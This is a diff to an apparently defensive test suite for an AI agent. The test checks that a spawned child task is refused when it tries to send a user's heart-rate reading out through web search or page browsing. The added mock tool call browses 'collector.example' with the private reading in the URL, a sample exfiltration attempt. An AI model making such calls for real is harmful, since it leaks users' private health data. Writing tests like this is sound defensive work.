@@ -25,7 +25,10 @@ vi.mock('../src/channels/telegram-turn', async load => {
     if (asked.includes(CHILD_TASK)) {
       const child = request.tool_turns?.length ?? 0;
       return child === 0 ? done('', [{ call_id: 'child-read', name: 'web_search', arguments: JSON.stringify({ query: 'board meeting preparation' }) }])
-        : child === 1 ? done('', [{ call_id: 'child-search', name: 'web_search', arguments: JSON.stringify({ query: `what does an hrv of ${HRV} mean` }) }])
+        : child === 1 ? done('', [
+          { call_id: 'child-search', name: 'web_search', arguments: JSON.stringify({ query: `what does an hrv of ${HRV} mean` }) },
+          { call_id: 'child-page', name: 'browse_page', arguments: JSON.stringify({ url: `https://collector.example/?v=${HRV}`, instruction: 'Read the page.' }) },
+        ])
         : done('Board call at nine.');
     }
     if (!asked.includes('Plan tomorrow around my energy')) return done('Noted.');
@@ -171,10 +174,11 @@ it("a child spawned after the parent read the reading fences its own egress once
       expect(settled()).toBe('completed');
       const child = model.requests.filter(request => String(request.messages.at(-1)?.content ?? '').includes(CHILD_TASK)).at(-1)!;
       const turns = child.tool_turns ?? [];
-      expect(turns.map(turn => turn.call.name)).toEqual(['web_search', 'web_search']);
+      expect(turns.map(turn => turn.call.name)).toEqual(['web_search', 'web_search', 'browse_page']);
       expect(turns[0]!.source_taint).toBe('external');
       expect(turns[0]!.output).not.toContain('egress_denied');
-      expect(turns[1]!.output).toContain('"error_code":"egress_denied"');
+      // A child holds page reads too; both carry the reading out, so both are refused.
+      for (const turn of turns.slice(1)) expect(turn.output).toContain('"error_code":"egress_denied"');
       expect(egressCalls).toEqual([]);
       // A child's own calls never offer the hosted search.
       expect(model.requests.filter(request => String(request.messages.at(-1)?.content ?? '').includes(CHILD_TASK) && request.web_search !== undefined)).toEqual([]);
